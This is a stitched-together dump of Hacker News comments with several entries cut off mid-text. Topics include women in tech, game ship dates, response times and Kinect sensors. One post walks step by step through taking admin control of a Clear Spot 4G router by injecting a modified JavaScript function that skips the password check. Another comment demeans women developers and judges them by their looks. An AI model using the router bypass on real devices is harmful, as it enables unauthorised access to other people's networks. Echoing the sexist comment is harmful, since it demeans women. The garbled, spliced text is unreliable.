1893233,comment,1892300,1892459,0,0,sp4rki,,,"Others have said it more eloquently, but it's simply that some women have a bone to pick and prefer to offload the burden of actually being good at their jobs, instead acquiring this sense of entitlement and superiority.<p>There are more men 'featured' in tech because women make a small part of the tech industry in general. Last time I checked women accounted to around 7% of of important roles in the tech industry and the number of female students of computer science was something close of 16/17%.<p>I've worked with women before on two occasions. The first one was a Php developer that was just plain awful, her code sucked, her attitude sucked, and whenever you tried to get her to mend her wrongdoings, the boss would come and ask you to just leave her alone because she loves to make claims of sex based discrimination. The second one was recently and she was one of the most amazing Java developers I've ever met, far better than most men. She was as geeky as could be, could joke with the boys all day (and freaking outdrink half of the men at night!), and she believed that ""women play the sex discrimination card when they're so bad they could be replaced by a monkey"". Honestly, it's the exact same thing as the just graduated mediocre programmer (not saying all recent graduates are mediocre, I'm targeting a specific group). They complain and complain about the unfairness of X and Y, but are seldom any good anyways.<p>It's simple stuff really. Since women are such a small part of the tech community, it's exponentially more probable that more men than women will stand out. On the bright side tough, the women that do stand out, stand out immensely. Oh and the kicker for my story in the past paragraph. The bad developer was really average looking (creeping into not good looking at all territory), while the good one was a stunning blond which would melt your heart in a second. C'est la vie.",1289462004

Finding the sweet spot in balancing quality of experience and ship-date.<p>A lot of game developers are so scared of shipping late that they put out crap as soon as its even remotely stable. They spend most of their effort on the ship-cycle treadmill rather than making the ship-cycle subservient to their desire to make excellent games. The same goes for many other creative endeavors such as software, books, movies. It takes serious guts to take a look at something that is nearly ready to be put in a box and sold to customers, and that has a realistic and high chance of turning a profit, and to say ""no, it's not good enough"". Even more so when you don't have a clear plan how to ""fix"" it.<p>On the other hand, it's easy to give in to the temptations of perfectionism and put off shipping indefinitely. Valve has managed to strike a balance, actually managing to ship games people love even after significant rework and even after significant time-lags (Team Fortress 2 spent almost a decade in development).",1289461976

1893218,story,,,2,0,jayphelps,"Show HN: How to hack a Clear Spot 4G (admin access to router)",,"Disclaimer: This is just for educational purposes to prove that you should never, ever, ever, EVER, use client-side ANYTHING to set sessions or check passwords.  Send the credentials server-side and keep it there. In reality, this exploit probably isn't a big deal, but just in case: I EXCEPT NO RESPONSIBILITY WHAT SO EVER. (After all, this is so easy it's retarded)<p>Okiedoke. So to start, you must be connected to the Clear Spot's wireless network.  If it's not password protected, this is simple.  If it's WEP protected (I've found most are) then it's almost as simple, and if it's WPA protected you have just a little bit more work.  I'm not going to go into explaining how to crack WEP/WPA.  You can find those details elsewhere. I haven't looked into remote access, but I assume it's behind quite a few proxies like cell phones.<p>Now that you're connected to the Clear Wi-Fi network, point your browser to http://192.168.0.1/.  From here you should see some basic information about the Clear device, a login section on the top, and links to navigate around.  You'll notice that they are all unavailable without admin access.<p>Using your favorite method, view the /js/common.js file and scroll down to the function hlogin().<p>The hlogin() function checks if the password field was just left empty, then calls lct_ajax_pok() with the password assigned to Endpassword.<p>Inside lct_ajax_pok() it sends an AJAX request to check if the password is correct and on completion, sends the results to check_pss().<p>check_pss() then checks if the response code was valid, it then sends the session id (sid) to send_sid().<p>Looking at send_sid(), you may be thinking this AJAX call verifies the session id against something server-side. Wrong. In fact, this function is actually sending a string that, until now, means nothing to the server.<p>In simple terms, it's SETTING the session ID through a client-side AJAX request. If you follow the rest of the functions, you'll see it setting a logged in cookie, etc.<p>What this means for us: if you just simply remove the conditional checking if the password was correct, the sessions ID will blindly get set and you become a <i>valid, logged in admin</i>..<p>So without further ado, all you have to do to gain full access is fire up your favorite debug console (I use Firebug) and inject the following modified function:<p><pre><code>    function check_pss(login_txt,vv)
    {
        send_sid(sid);
    }
</code></pre>
Once it's injected, type literally ANY password into the Admin Login and hit OK.<p>Congrats. You are now admin and can do/change whatever you please. Enjoy.<p><pre><code>    --------------------------------------------

It is long enough for the user to start to forget what he expects from the system or to think about swiching to another activity while the current one loads. That is also the reason why database transaction benchmarks are always defined by number of transactions per second at a response time of slightly under two seconds, that is the threshold where they can still claim that the benchmark measures something about a system that is actually usable in practice.<p>So cutting response times by a second from say two seconds to one second changes the percieved delays from barely tolereble to barely noticable, which is unually beneficial for interactive apps.",1289460088

It's called a flash LIDAR camera, and the quality and robustness of the depth data is far beyond anything achievable from stereo vision today even with high-end cameras, let alone webcams.<p>edit: Actually, there seems to be some confusion on the Internet about exactly how Kinect's depth sensor works, and it may be more likely based on structured light scanning than LIDAR (though Microsoft has recently acquired some LIDAR startups).

Once you know what you want to build, building software is about five things: algorithms that solve your problem, programming languages that express your algorithms, computer architecture that makes your algorithms run efficiently on real hardware, the practical toolchain, and the management of complexity of real software.
